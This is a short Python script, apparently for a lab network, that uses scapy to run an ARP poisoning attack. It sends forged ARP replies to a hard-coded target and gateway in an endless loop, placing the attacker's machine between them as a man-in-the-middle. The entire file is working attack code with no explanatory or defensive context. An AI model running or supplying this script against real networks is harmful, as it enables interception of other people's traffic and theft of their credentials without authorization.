from scapy.all import *
import subprocess
import time

targetIp = "10.10.10.4"
gatewayIp = "10.10.10.2"

ifconfigResult = subprocess.check_output("ifconfig eth0",shell=True).decode()
attackMac = re.search("ether(.*?)t",ifconfigResult).group(1).strip()

eth = Ether(src=attackMac)
h_arp = ARP(hwsrc=attackMac,psrc=gatewayIp,pdst=targetIp)
g_arp = ARP(hwsrc=attackMac,psrc=targetIp,pdst=gatewayIp)

print("ARP Poising Start")

while True:
    try:
        sendp(eth/h_arp)
        sendp(eth/g_arp)
    except KeyboardInterrupt:
        print("Stopped")
        break
    time.sleep(1)
